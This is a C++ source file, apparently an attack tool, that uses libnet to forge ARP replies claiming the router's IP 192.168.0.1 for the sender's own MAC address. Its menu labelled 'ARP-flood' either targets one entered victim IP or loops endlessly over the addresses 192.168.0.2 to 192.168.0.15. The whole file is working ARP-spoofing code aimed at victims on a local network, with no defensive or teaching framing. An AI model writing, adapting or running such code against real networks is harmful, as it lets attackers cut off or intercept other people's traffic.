#include <arpa/inet.h>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <libnet.h>
#include <libnet/libnet-functions.h>
#include <libnet/libnet-headers.h>
#include <pcap.h>
#include <pcap/pcap.h>

void send_packet(std::string router_ip_str, std::string victim_ip_str) {
  uint32_t router_ip;
  uint32_t victim_ip;
  if (inet_pton(AF_INET, router_ip_str.c_str(), &router_ip) != 1) {
    std::cerr << "[!!] Invalid router IP format" << std::endl;
    return;
  }

  if (inet_pton(AF_INET, victim_ip_str.c_str(), &victim_ip) != 1) {
    std::cerr << "[!!] Invalid victim IP format" << std::endl;
    return;
  }

  char errbuf_libnet[LIBNET_ERRBUF_SIZE];
  libnet_t *l = libnet_init(LIBNET_LINK, "wlan0", errbuf_libnet);
  if (l == nullptr) {
    std::cerr << "[!!] libnet_init: " << errbuf_libnet << std::endl;
    return;
  }

  struct libnet_ether_addr *eth_addr;
  uint8_t my_mac[6];

  eth_addr = libnet_get_hwaddr(l);
  memcpy(my_mac, eth_addr->ether_addr_octet, 6);

  u_int8_t bcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

  libnet_clear_packet(l);

  libnet_ptag_t arp_ptag =
      libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, 6, 4, ARPOP_REPLY, my_mac,
                       (uint8_t *)&router_ip, bcast_mac, (uint8_t *)&victim_ip,
                       nullptr, 0, l, 0);

  if (arp_ptag == -1) {
    std::cerr << "[!!] Failed to build ARP: " << libnet_geterror(l)
              << std::endl;
    return;
  }

  libnet_ptag_t eth_ptag =
      libnet_build_ethernet(bcast_mac, my_mac, ETHERTYPE_ARP, nullptr, 0, l, 0);

  if (eth_ptag == -1) {
    std::cerr << "[!!] Failed to build Ethernet: " << libnet_geterror(l)
              << std::endl;
    return;
  }

  int packet_size = libnet_write(l);

  if (packet_size == -1) {
    fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
  }

  libnet_destroy(l);
}

int arp_sniffing() {
  short style;

  std::string router_ip_str = "192.168.0.1";
  std::string victim_ip_str = "";

  std::cout << "  [ 1 ] - input ip" << std::endl;
  std::cout << "  [ 2 ] - all ip [16]" << std::endl;
  std::cout << "  input: ";
  std::cin >> style;

  switch (style) {
  case 1: {
    std::cout << "  input victim_ip: ";
    std::cin >> victim_ip_str;
    std::cout << "  \033[38;5;196mARP-flood:\t" << router_ip_str << " </3 "
              << victim_ip_str << "..." << "\033[0m" << std::endl;
    while (true) {
      send_packet(router_ip_str, victim_ip_str);
    }
  }
  case 2: {
    while (true) {
      for (int i = 2; i < 16; i++) {
        char ip[16];
        snprintf(ip, sizeof(ip), "192.168.0.%d", i);
        std::cout << "  \033[38;5;196mARP-flood:\t" << router_ip_str << " </3 "
                  << ip << "..." << "\033[0m" << std::endl;
        send_packet(router_ip_str, ip);
      }
    }
  }
  }

  return 0;
}
